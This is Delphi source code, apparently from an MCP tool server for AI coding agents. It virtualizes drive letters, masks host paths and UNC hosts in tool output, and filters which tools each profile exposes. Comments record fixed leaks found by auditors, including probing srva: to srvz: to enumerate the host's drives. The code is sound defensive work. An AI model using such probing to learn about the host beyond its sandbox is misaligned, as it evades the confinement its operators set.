  GDrvLetters: string; // uppercase letters of every served drive, e.g. 'DC'

{ The drives that can legitimately appear in tool output: those hosting the
  workspace roots, the library zone (RAD Studio + components) and the
  knowledge vault. Cached. }
function ServedDriveLetters: string;

  procedure AddDriveOf(const APath: string);
  begin
    if (Length(APath) >= 2) and (APath[2] = ':') and
       CharInSet(APath[1], ['A'..'Z', 'a'..'z']) and
       (Pos(UpCase(APath[1]), GDrvLetters) = 0) then
      GDrvLetters := GDrvLetters + UpCase(APath[1]);
  end;

var
  R: string;
begin
  if not GDrvLoaded then
  begin
    GDrvLetters := '';
    for R in WorkspaceRoots do
      AddDriveOf(R);
    for R in LibraryRoots do
      AddDriveOf(R);
    for R in WorkspaceReadOnlyRoots do
      AddDriveOf(R);
    // The vault is a served root of its OWN: it sits deliberately outside the
    // code jail and outside the library zone, so neither list carries it. A
    // vault on another letter used to leak that letter unmasked, and its
    // srvX: form did not resolve on the way in - it goes through the same
    // door as everybody else.
    AddDriveOf(VaultPath);
    GDrvLoaded := True;
  end;
  Result := GDrvLetters;
end;

{ EL NOMBRADOR de la unidad virtual, y la inversa exacta de la funcion que
  viene justo debajo: esa LEE la forma, esta la ESCRIBE. Nadie la compone a
  mano en ningun sitio.

  Estaba escrita a mano en CUATRO: las tres formas de MaskDriveText (la ruta
  normal, el %3A de las URIs del motor, y la unidad a secas) y la lista de
  unidades validas de PathAnomaly. Las cuatro decian
  'srv' + Char(Ord(...) + 32), pero no igual: tres hacian UpCase antes y la
  cuarta no, apoyandose en que ServedDriveLetters promete mayusculas
  cuatrocientas lineas mas arriba. Ninguna estaba mal; era la forma de que
  una se desviase. Lo pregunto David el 2026-09-21 -"lo de enmascarar y
  desenmascarar las unidades esta centralizado, no?"- el dia despues de
  encontrar exactamente esta misma forma en los nombres de la papelera:
  alli el lector estaba unificado y habia TRES escritores.

  Una letra que este servidor no sirve sale como 'srv0': dice que hay una
  ruta y no dice donde. Era 'srvx', que es EXACTAMENTE lo que produce una
  unidad X: servida de verdad (una red mapeada como X: es lo normal): el
  nombrador dejaba de ser inyectivo y su inversa expandia el centinela a
  X:\ (auditoria 2026-09-21). El '0' no es letra: no puede chocar con
  nada servido, y VirtualUnitLetter lo reconoce para que PathAnomaly lo
  rechace POR NOMBRE con la lista de unidades validas, como a cualquier
  otra unidad no servida. }
function VirtualUnitOf(ALetter: Char; const AServed: string): string;
begin
  if (ALetter <> #0) and (Pos(UpCase(ALetter), AServed) > 0) then
    Result := 'srv' + Char(Ord(UpCase(ALetter)) + 32)
  else
    Result := 'srv0';
end;

{ The ONE place that recognizes the virtual-unit shape: 'srvd:', 'srvd:\x',
  'srvd:/x' - y el centinela 'srv0:', para que su rechazo sea el de una
  unidad no servida. Returns the upper-case letter, or #0 when the value is not a
  virtual unit at all. Both the inbound expansion and the rejection of an
  unserved unit ask this - the shape is never re-tested by hand. }
function VirtualUnitLetter(const AValue: string): Char;
begin
  Result := #0;
  if (Length(AValue) >= 5) and StartsText('srv', AValue) and
     CharInSet(AValue[4], ['A'..'Z', 'a'..'z', '0']) and (AValue[5] = ':') then
    if (Length(AValue) = 5) or CharInSet(AValue[6], ['\', '/']) then
      Result := UpCase(AValue[4]);
end;

{ 'srvd:\x' / 'srvd:/x' / bare 'srvd:' -> 'D:\x' ... Whole-value prefix match
  only; anything else comes back untouched (real paths keep working).
  Only a SERVED letter expands. Mapping an unserved 'srvz:' to the real 'Z:\'
  put a drive of the host into the rejection echo, and the outbound mask
  covers served letters only, so it travelled back raw: probing srva: .. srvz:
  enumerated the machine's drives (field round 10). An unserved unit now stays
  literal and PathAnomaly refuses it by name, without ever reaching disk. }
function ExpandDriveValue(const AValue: string): string;
var
  Letter: Char;
begin
  Result := AValue;
  Letter := VirtualUnitLetter(AValue);
  if (Letter <> #0) and (Pos(Letter, ServedDriveLetters) > 0) then
    Result := Letter + Copy(AValue, 5, MaxInt);
end;

{ Rewrites the string arguments of a tools/call in place. Content-carrying
  parameters are never touched: their text belongs to files/messages, not to
  the path namespace. }
procedure ExpandVirtualDrives(const AArguments: TJSONObject);
var
  I: Integer;
  P: TJSONPair;
  Names, Vals: TStringList;
  V, N: string;
begin
  if not Assigned(AArguments) then
    Exit;
  Names := TStringList.Create;
  Vals := TStringList.Create;
  try
    for I := 0 to AArguments.Count - 1 do
    begin
      P := AArguments.Pairs[I];
      if not (P.JsonValue is TJSONString) then
        Continue;
      if MatchText(P.JsonString.Value, PARAMS_CON_CONTENIDO) then
        Continue;
      V := TJSONString(P.JsonValue).Value;
      N := ExpandDriveValue(V);
      if N <> V then
      begin
        Names.Add(P.JsonString.Value);
        Vals.Add(N);
      end;
    end;
    for I := 0 to Names.Count - 1 do
    begin
      AArguments.RemovePair(Names[I]).Free;
      AArguments.AddPair(Names[I], Vals[I]);
    end;
  finally
    Names.Free;
    Vals.Free;
  end;
end;

function MaskDriveText(const AToolName, AText: string): string;
var
  Sb: TStringBuilder;
  Letters: string;
  I, L: Integer;
  C, PrevC: Char;
begin
  // delphi_read is the ONE exemption: its payload is the file's TEXT, which
  // may legitimately contain "D:\..." that an edit anchor must match
  // byte-for-byte. delphi_fetch is NOT exempt (fixed after field round 4):
  // its payload is base64, whose alphabet has neither ':' nor '%', so
  // masking can never corrupt it - while its "path" field must be
  // virtualized like every other path the client sees.
  // The vault tools are exempt on the same grounds: their payload is the
  // TEXT of a note, and an agent copies fragments of it verbatim to build the
  // "anchor" / "old_text" of a later vault_append / vault_patch. Masking it
  // would silently break every anchored write (the fragment would no longer
  // match the file on disk). Vault paths are relative and carry no drive
  // letter, and the vault is knowledge the operator chose to expose.
  // ...and an exception that ESCAPED a tool is not content either. The
  // dispatcher wraps ANY exception as "Error executing tool: <E.Message>", and
  // a Delphi I/O exception embeds the REAL absolute path (EFOpenError: 'Cannot
  // open file "D:\..."'), reachable on a locked or ACL-denied file - the read
  // paths have no try/except of their own. Case-SENSITIVE and the exact
  // wrapper token on purpose: a delphi_read result starts with the FILE NAME
  // and a note may start with "Error", so a loose case-insensitive 'error'
  // test would silently mask real content and break every anchored write built
  // on it.
  // delphi_search joined them 2026-09-20, and it was the loudest of all:
  // its "text" field is a VERBATIM line of the file, published precisely so
  // an agent can copy it as an edit anchor - and the blanket mask rewrote
  // the drive letter INSIDE it. README.md:358 reads "Roots=D:\Projects\..."
  // and the search answered "Roots=srvd:\Projects\...": an anchor copied
  // from a hit could never match the disk, and a documentation file was
  // quoted wrong. It masks its own "path" fields instead (see there).
  // delphi_edit y delphi_textedit, por lo mismo y con una vuelta de tuerca:
  // su eco de verificacion son las lineas RELEIDAS DEL DISCO, que es la
  // prueba con la que el agente comprueba que escribio lo que queria. Si esa
  // prueba va enmascarada, no prueba nada. Encontrado escribiendo este mismo
  // CHANGELOG el 2026-09-20: se escribio "D:\Projects\Galatea", el disco lo
  // tenia bien, y el eco devolvia "srvd:\Projects\Galatea". Sus negativas
  // empiezan por RECHAZADO/error y siguen enmascarandose por el test de
  // abajo.
  //
  // LA OBLIGACION QUE VIENE CON ESTAR EN ESTA LISTA, y es facil de olvidar:
  // la exencion es por TOOL, pero solo el ECO merece exencion. Todo lo que
  // una de estas tools COMPONGA ella misma -una ruta en un mensaje, un campo
  // "path" de un JSON- tiene que pasar a mano por MaskDriveText('', ruta),
  // que es esta misma funcion con el nombre de tool vacio. delphi_search lo
  // hace asi con sus campos "path" (ver Mcp.Tools.Workspace). delphi_textedit
  // NO lo hacia con la ruta de su "CREADO %s" y sacaba la letra real del
  // servidor; aqui ponia escrito que "sus ecos de exito no llevan rutas
  // absolutas", que era FALSO y es justo lo que hizo que nadie mirara. Lo
  // caza ya la bateria test_round40, en las dos direcciones: que no salga la
  // letra real, y que el contenido del disco NO venga enmascarado.
  if MatchText(AToolName, ['delphi_read', 'vault_read', 'vault_search',
                           'delphi_search', 'delphi_edit',
                           'delphi_textedit']) and
     not (AText.StartsWith('RECHAZADO') or AText.StartsWith('error') or
          AText.StartsWith('Error executing tool: ')) then
    Exit(AText);
  Letters := ServedDriveLetters;
  if (Letters = '') or (AText = '') then
    Exit(AText);
  Sb := TStringBuilder.Create(Length(AText) + 64);
  try
    I := 1;
    L := Length(AText);
    while I <= L do
    begin
      C := AText[I];
      // Any drive letter, not only the served ones. The mask was a C/D
      // allowlist, so E:\secret\x.inc or z:\... walked out untouched
      // (found 2026-08-25 by an auditor). Nothing real leaks on THIS machine
      // today - only C: and D: exist and both are mapped - but a root on
      // another drive, or a file referenced from one, would have. An
      // unmapped letter travels as srv0: : the reader learns there is a path
      // and learns nothing about where.
      if CharInSet(UpCase(C), ['A' .. 'Z']) then
      begin
        if I = 1 then
          PrevC := #0
        else
          PrevC := AText[I - 1];
        // ...but by the time this runs the text is already JSON, where a line
        // break is the two characters \ and n. That made the LETTER 'n' the
        // previous char for every path that starts a line, and the guard below
        // let it through unmasked: the real C:\Program Files... leaked in
        // multi-line fields (build outputTail) while the same path masked fine
        // inside single-line ones (errors[]). Measured, field round 8.
        if (I >= 3) and CharInSet(PrevC, ['n', 'r', 't']) and
           (AText[I - 2] = '\') then
          PrevC := #10;
        // A drive prefix only starts where the previous char is not a
        // letter/digit (keeps git's "HEAD:" and words intact).
        if not CharInSet(PrevC, ['A'..'Z', 'a'..'z', '0'..'9']) then
        begin
          // form A - plain path: <letter>:<separator> (D:\ or D:/)
          if (I + 2 <= L) and (AText[I + 1] = ':') and
             CharInSet(AText[I + 2], ['\', '/']) then
          begin
            Sb.Append(VirtualUnitOf(C, Letters)).Append(':');
            Inc(I, 2);
            Continue;
          end;
          // form B - percent-encoded colon in a file URI: <letter>%3A/ ...
          // (DelphiLSP answers with file:///D%3A/... - measured, R3-1).
          if (I + 4 <= L) and (AText[I + 1] = '%') and (AText[I + 2] = '3') and
             ((AText[I + 3] = 'A') or (AText[I + 3] = 'a')) and (AText[I + 4] = '/') then
          begin
            // Aqui los dos puntos van codificados (%3A), asi que el nombrador
            // pone la unidad y el separador se copia tal cual viene.
            Sb.Append(VirtualUnitOf(C, Letters));
            Sb.Append(AText[I + 1]).Append(AText[I + 2]).Append(AText[I + 3]);
            Inc(I, 4);
            Continue;
          end;
          // forma B2 - la unidad SIN separador detras: "D:" a secas, o una
          // ruta relativa a la unidad como "D:foo\bar". La forma A pide
          // <letra>:<separador>, asi que estas salian con la LETRA REAL en
          // cada negativa que echoa el parametro del que llama:
          //   delphi_list root="D:"       -> RECHAZADO: "D:" esta FUERA...
          //   delphi_git  repo="C:"       -> idem, en todas las tools
          // Y eso no es solo incumplir el contrato: como C:\Windows si sale
          // como srvc:, el lector deduce el mapeo entero. Medido 2026-09-20
          // por un agente auditor; es la misma forma del roots:["D:"] de esa
          // misma manana.
          //
          // Donde NO se toca, para no estropear texto que no es una ruta:
          // si tras los dos puntos viene un ESPACIO ("opcion C: haz esto") o
          // un DIGITO (una clave JSON de una letra, "a":1), se deja como
          // esta. Una ruta nunca empieza por espacio, y "D:1" no es un caso
          // que se de aqui.
          if (I + 1 <= L) and (AText[I + 1] = ':') and
             ((I + 2 > L) or
              not CharInSet(AText[I + 2],
                            [' ', #9, #10, #13, '0' .. '9'])) then
          begin
            Sb.Append(VirtualUnitOf(C, Letters)).Append(':');
            Inc(I, 2);
            Continue;
          end;
        end;
      end;
      // form C - a UNC path, whose HOST names the machine and what it can
      // see. Two shapes, and both have to be told apart from an ordinary
      // separator: by the time this runs the text is usually JSON, where a
      // single \ is written \\ - so "C:\\Users" is NOT a UNC, and a first
      // attempt at this rule happily turned it into "srvc:\srvhost" and ate
      // the rest of the path (caught by the battery, same day).
      //   raw text: \\host\share   - two, after a delimiter, then a letter
      //   inside JSON: \\\\host   - four, then a letter
      // The JSON form fires ONLY after a delimiter, like the raw form: the
      // Linux64 linker echoes its command line with backslashes ALREADY
      // doubled, which the JSON encoding doubles again - so mid-path every
      // re-doubled separator looked like a UNC opener and the whole tail
      // collapsed into srvhost after srvhost (sweep10's report, reproduced
      // 2026-08-26: 227 masks in one outputTail). A genuine UNC never starts
      // glued to a letter; a re-doubled path separator always does.
      if (C = '\') and (I + 4 <= L) and (AText[I + 1] = '\') and
         (AText[I + 2] = '\') and (AText[I + 3] = '\') and
         CharInSet(AText[I + 4], ['A'..'Z', 'a'..'z', '0'..'9']) and
         ((I = 1) or CharInSet(AText[I - 1],
            [' ', #9, '"', '''', '(', ',', '=', #10, #13])) then
      begin
        Sb.Append('\\\\srvhost');
        Inc(I, 4);
        while (I <= L) and not CharInSet(AText[I], ['\', '/', '"', ' ', #9]) do
          Inc(I);
        Continue;
      end;
      if (C = '\') and (I + 2 <= L) and (AText[I + 1] = '\') and
         CharInSet(AText[I + 2], ['A'..'Z', 'a'..'z', '0'..'9']) and
         ((I = 1) or CharInSet(AText[I - 1],
            [' ', #9, '"', '''', '(', ',', '=', #10, #13])) then
      begin
        Sb.Append('\\srvhost');
        Inc(I, 2);
        while (I <= L) and not CharInSet(AText[I], ['\', '/', '"', ' ', #9]) do
          Inc(I);
        Continue;
      end;
      Sb.Append(C);
      Inc(I);
    end;
    Result := Sb.ToString;
  finally
    Sb.Free;
  end;
end;


function ToolHiddenFromList(const AToolName: string): Boolean;
const
  // the mailbox and the manual never disappear: they are how an agent asks
  // for help and how it reports that something is missing
  ALWAYS: array [0 .. 2] of string = ('delphi_help', 'delphi_messages',
    'delphi_report');
  // reader: understand and navigate, nothing that writes or ships
  READER: array [0 .. 18] of string = ('delphi_read', 'delphi_list',
    'delphi_search', 'delphi_symbols', 'delphi_definition', 'delphi_hover',
    'delphi_signature', 'delphi_completion', 'delphi_diagnostics',
    'delphi_references', 'delphi_projects', 'delphi_installs',
    'delphi_workspace', 'delphi_fetch', 'delphi_help', 'delphi_messages',
    'delphi_report', 'vault_read', 'vault_search');
  // coder hides only the shipping trio; everything else is a coder's tool
  DEPLOY_ONLY: array [0 .. 2] of string = ('delphi_adb', 'delphi_paserver',
    'delphi_package');
var
  N, Prof: string;
begin
  N := AToolName.Trim.ToLower;
  if MatchText(N, ALWAYS) then
    Exit(False);
  if Length(GToolsOnly) > 0 then
    Exit(not MatchText(N, GToolsOnly));
  // a workspace may carry its own profile; it wins over the global one
  Prof := GToolsProfile;
  if HasActiveWS and
     (ActiveWS.Profile <> '') then
    Prof := ActiveWS.Profile;
  if Prof = 'reader' then
    Exit(not MatchText(N, READER));
  if Prof = 'coder' then
    Exit(MatchText(N, DEPLOY_ONLY));
  Result := False; // full, or an unknown profile name: hide nothing
end;

initialization
  GIdentLock := TCriticalSection.Create;
  GSesiones := TList<TSesion>.Create;

finalization

  GSesiones.Free;
  GIdentLock.Free;

end.